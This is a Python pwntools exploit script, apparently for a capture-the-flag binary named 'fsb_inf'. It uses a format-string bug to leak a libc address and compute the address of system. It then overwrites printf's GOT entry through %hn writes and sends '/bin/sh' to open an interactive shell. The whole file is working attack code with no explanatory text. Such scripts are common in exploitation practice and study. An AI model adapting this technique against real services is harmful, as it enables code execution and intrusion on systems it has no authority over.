#!/usr/bin/env python
# coding = utf-8
from pwn import *
#context.log_level="debug"
context(terminal='zsh')

# p = remote('0',8888)
p = process('fsb_inf') #,env = {'LD_PRELOAD'}
# libc =ELF ('libc.so.6')
elf =ELF('fsb_inf')

#gdb.attach(p, '''
#continue
#''')
#put_got = elf.got["puts"] #0x601020
#get_shell = 0x4008c9
printf_addr = elf.got["printf"]
offset_main = 0x202e1
offset_system = 0x3f480
offset_printf = 0x4f190

def s_sub(a,b):
	if a < b:
		return 0x10000+a-b
	return a-b

pattern = "%{}c%{}$hn"

payload = ""
payload += "%78$p.%79$p.%80$p"

p.recv()
p.sendline(payload)
p.recvuntil(".")
libc_start_main = int(p.recvuntil(".",drop = True),16)

print hex(libc_start_main)

libc_base = libc_start_main - offset_main
system_addr = libc_base + offset_system
printf_addr = libc_base + offset_printf

print hex(system_addr)
print hex(printf_addr)

n = 6 + 4
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff

payload = ""
payload += pattern.format(system_low ,n)
payload += pattern.format(s_sub(system_high,system_low) ,n+1)

payload = payload.ljust(32,"A")

payload += p64(elf.got["printf"])
payload += p64(elf.got["printf"] + 2)

p.sendline(payload)
pause()
p.sendline("/bin/sh\x00")

p.interactive()
